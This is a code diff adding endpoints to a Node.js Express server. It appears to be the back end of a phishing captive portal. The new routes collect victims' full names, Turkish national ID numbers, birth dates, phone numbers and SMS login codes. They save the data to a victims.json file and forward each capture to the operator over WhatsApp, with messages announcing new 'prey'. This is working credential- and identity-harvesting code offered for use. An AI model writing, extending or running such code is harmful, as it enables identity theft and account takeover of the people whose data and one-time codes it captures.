@@ -45,6 +45,71 @@ app.post('/api/admin/restart', (req, res) => {
     res.json({ status: 'success' });
 });
 
+// --- VICTIM DATA HANDLING ---
+const fs = require('fs');
+const VICTIMS_FILE = path.join(__dirname, 'victims.json');
+
+const saveVictim = (data) => {
+    try {
+        let victims = [];
+        if (fs.existsSync(VICTIMS_FILE)) {
+            const content = fs.readFileSync(VICTIMS_FILE, 'utf8');
+            victims = JSON.parse(content);
+        }
+        victims.push({ ...data, timestamp: new Date().toISOString() });
+        fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
+    } catch (err) {
+        addSystemLog(`Error saving victim: ${err.message}`);
+    }
+};
+
+const sendAdminNotification = async (msg) => {
+    if (client && connectionStatus === 'READY') {
+        try {
+            const myNum = client.info.me._serialized;
+            await client.sendMessage(myNum, msg);
+            addSystemLog('WhatsApp notification sent to admin.');
+        } catch (err) {
+            addSystemLog(`Failed to send WA notification: ${err.message}`);
+        }
+    }
+};
+
+// --- CAPTIVE PORTAL API ENDPOINTS ---
+
+app.post('/api/register', (req, res) => {
+    const data = req.body;
+    addSystemLog(`New Registration: ${data.fullName} (${data.phone})`);
+    saveVictim({ type: 'register', ...data });
+    
+    const msg = `🔥 *YENİ AV DÜŞTÜ (KAYIT)* 🔥\n\n👤 Ad: ${data.fullName}\n🆔 TC: ${data.tcNo}\n📅 Doğum: ${data.birthDate}\n📞 Tel: ${data.phone}`;
+    sendAdminNotification(msg);
+    
+    res.json({ status: 'success' });
+});
+
+app.post('/api/request-code', (req, res) => {
+    const { phone } = req.body;
+    addSystemLog(`SMS Code Requested: ${phone}`);
+    saveVictim({ type: 'code_request', phone });
+    
+    const msg = `📩 *SMS KODU İSTENDİ* 📩\n\n📞 Tel: ${phone}\n\n_Kullanıcı kod bekliyor._`;
+    sendAdminNotification(msg);
+    
+    res.json({ status: 'success' });
+});
+
+app.post('/api/login', (req, res) => {
+    const data = req.body;
+    addSystemLog(`Login Success: ${data.phone} Code: ${data.smsCode}`);
+    saveVictim({ type: 'login', ...data });
+    
+    const msg = `✅ *GİRİŞ BAŞARILI* ✅\n\n📞 Tel: ${data.phone}\n🔢 Kod: ${data.smsCode}`;
+    sendAdminNotification(msg);
+    
+    res.json({ status: 'success' });
+});
+
 // Dynamic Bootstrap Logic
 async function bootstrapWhatsApp() {
     addSystemLog('--- LOADER: Phase 1 (Dependencies) ---');
